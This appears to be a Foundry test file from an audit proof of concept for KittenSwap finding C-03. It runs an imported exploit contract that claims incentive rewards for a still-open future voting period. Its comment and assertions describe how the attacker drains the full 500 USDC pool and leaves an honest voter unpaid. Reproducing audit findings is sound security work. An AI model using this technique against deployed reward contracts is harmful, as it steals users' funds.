// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, VotingReward, Voter, VeKitten, MiniToken} from "./58207-c-03-incentive-rewards-may-be-stolen-pashov-audit-group-none.sol";

// KittenSwap C-03 (finding 58207): VotingReward.getRewardForPeriod lacks a
// future-period guard. The attacker votes into the still-open next period,
// claims 100% of a 500 USDC incentive it never funded, and an honest co-voter
// is left owed 250 USDC the drained pool cannot pay.
contract Finding58207Test is Test {
    function test_exploit_futurePeriodReward_stolen() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("attacker funded", e.attackerFunded());
        emit log_named_uint("attacker profit (drained)", e.attackerProfit());
        emit log_named_uint("period at claim", e.periodAtClaim());
        emit log_named_uint("future period claimed", e.futurePeriod());
        emit log_named_uint("honest voter owed", e.carolOwed());
        emit log_named_uint("honest voter received", e.carolReceived());
        emit log_named_uint("reward pool after", e.poolAfter());

        // the claim was of a still-open FUTURE period (< current would be legal)
        assertLt(e.periodAtClaim(), e.futurePeriod(), "claim must be of a future period");
        // attacker risked nothing and drained the full 500 USDC incentive
        assertEq(e.attackerFunded(), 0, "attacker funded nothing");
        assertEq(e.attackerProfit(), 500e6, "attacker stole full 500 USDC incentive");
        // honest co-voter is owed her fair 250 USDC but the pool is empty
        assertEq(e.carolOwed(), 250e6, "honest voter owed fair share");
        assertEq(e.carolReceived(), 0, "honest voter robbed");
        assertEq(e.poolAfter(), 0, "reward pool fully drained");
    }
}
